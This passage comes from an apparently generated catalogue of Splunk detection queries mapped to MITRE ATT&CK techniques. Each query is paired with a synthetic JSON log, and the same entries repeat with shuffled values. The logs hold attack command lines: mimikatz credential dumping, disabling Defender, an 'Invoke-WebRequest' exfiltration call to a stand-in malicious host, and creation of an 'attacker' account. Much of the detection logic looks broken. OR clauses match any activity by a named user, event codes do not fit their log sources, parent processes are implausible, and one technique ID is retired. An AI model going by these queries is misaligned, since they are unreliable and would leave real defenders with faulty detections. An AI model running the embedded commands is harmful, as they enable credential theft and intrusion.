index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:50:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.135",
  "DestinationPort": "3389"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:52:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.141",
  "DestinationPort": "445"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\services.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:54:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\services.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.140",
  "DestinationPort": "445"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:56:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.140",
  "DestinationPort": "445"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\wininit.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:58:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\wininit.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.127",
  "DestinationPort": "8443"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:00:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.101",
  "DestinationPort": "80"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:02:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.114",
  "DestinationPort": "443"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:04:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.102",
  "DestinationPort": "8443"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 63"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:06:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 63",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.106",
  "DestinationPort": "8443"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\wininit.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:08:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\wininit.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.118",
  "DestinationPort": "445"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\wininit.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:10:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\wininit.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.141",
  "DestinationPort": "8443"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:12:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.102",
  "DestinationPort": "8080"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\smss.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:14:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\smss.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.135",
  "DestinationPort": "22"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:16:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.116",
  "DestinationPort": "8080"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:18:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.143",
  "DestinationPort": "443"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:20:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.144",
  "DestinationPort": "80"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\services.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:22:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\services.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.138",
  "DestinationPort": "3389"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\services.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:24:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\services.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.149",
  "DestinationPort": "443"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 73"
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:26:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 73",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.130",
  "DestinationPort": "445"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:28:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.136",
  "DestinationPort": "3389"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\services.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:30:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\services.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.132",
  "DestinationPort": "445"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:32:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.131",
  "DestinationPort": "3389"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:34:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.113",
  "DestinationPort": "8443"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:36:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.122",
  "DestinationPort": "3389"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:38:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.136",
  "DestinationPort": "8443"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\wininit.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:40:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\wininit.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.139",
  "DestinationPort": "445"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\services.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:42:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\services.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.120",
  "DestinationPort": "22"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\wininit.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:44:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\wininit.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.146",
  "DestinationPort": "8443"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 83"
OR ParentProcessName="C:\Windows\System32\wininit.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:46:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 83",
  "ParentProcessName": "C:\Windows\System32\wininit.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.122",
  "DestinationPort": "80"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:48:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.118",
  "DestinationPort": "22"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:50:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.120",
  "DestinationPort": "8443"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:52:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.123",
  "DestinationPort": "445"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:54:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.132",
  "DestinationPort": "3389"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:56:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.118",
  "DestinationPort": "443"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\smss.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:58:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\smss.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.146",
  "DestinationPort": "22"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:00:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.134",
  "DestinationPort": "8080"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\services.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:02:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\services.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.117",
  "DestinationPort": "8080"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\smss.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:04:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\smss.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.136",
  "DestinationPort": "8443"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 93"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:06:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 93",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
